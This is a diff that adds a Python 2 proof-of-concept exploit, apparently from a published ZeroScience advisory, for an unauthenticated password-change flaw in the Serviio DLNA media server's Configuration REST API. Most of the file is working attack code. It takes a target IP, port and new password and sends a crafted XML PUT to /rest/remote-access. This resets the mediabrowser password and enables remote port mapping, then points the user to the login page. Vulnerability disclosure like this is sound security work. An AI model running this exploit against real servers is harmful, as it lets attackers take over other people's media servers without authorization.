@@ -1,0 +1,77 @@
+#!/usr/bin/env python
+#
+#
+# Serviio PRO 1.8 DLNA Media Streaming Server REST API Arbitrary Password Change
+#
+#
+# Vendor: Petr Nejedly | Six Lines Ltd
+# Product web page: http://www.serviio.org
+# Affected version: 1.8.0.0 PRO, 1.7.1, 1.7.0, 1.6.1
+#
+# Summary: Serviio is a free media server. It allows you to stream your media
+# files (music, video or images) to renderer devices (e.g. a TV set, Bluray player,
+# games console or mobile phone) on your connected home network.
+#
+# Desc: The version of Serviio installed on the remote Windows/Linux host is affected
+# by an unauthenticated password modification vulnerability due to improper access
+# control enforcement of the Configuration REST API. A remote attacker can exploit this,
+# via a specially crafted request, to change the login password for the mediabrowser protected
+# page.
+#
+# Tested on: Restlet-Framework/2.2
+#            Windows 7, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#            Mac OS X, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#            Linux, UPnP/1.0 DLNADOC/1.50, Serviio/1.8
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5407
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5407.php
+#
+# SSD Advisory: https://blogs.securiteam.com/index.php/archives/3094
+#
+#
+# 12.12.2016
+#
+
+
+import sys
+import xml.etree.ElementTree as ET
+from urllib2 import Request, urlopen
+
+if (len(sys.argv) <= 3):
+        print '[*] Usage: serviio_pwd.py <ipaddress> <port> <newpassword>'
+        print '[*] Example: serviio_pwd.py 10.211.55.3 23423 eagle20fox2'
+        exit(0)
+
+host = sys.argv[1]
+port = sys.argv[2] #default port for console is 23423, and for the mediabrowser is 23424.
+lozi = sys.argv[3]
+
+values = """
+<remoteAccess>
+    <remoteUserPassword>{0}</remoteUserPassword>
+    <preferredRemoteDeliveryQuality>ORIGINAL</preferredRemoteDeliveryQuality>
+    <portMappingEnabled>true</portMappingEnabled>
+    <externalAddress>myserviio.dyndns.com</externalAddress>
+</remoteAccess>"""
+
+put = values.format(lozi)
+
+headers = {
+  'Content-Type': 'application/xml',
+  'Accept': 'application/xml'
+}
+request = Request('http://'+host+':'+port+'/rest/remote-access', data=put, headers=headers)
+request.get_method = lambda: 'PUT'
+response_body = urlopen(request).read()
+roottree = ET.fromstring(response_body)
+
+for errorcode in roottree.iter('errorCode'):
+     print "\nReceived error code: "+errorcode.text
+
+print 'Password successfully changed to: '+lozi
+print 'Go to: http://'+host+':23424/mediabrowser\n'
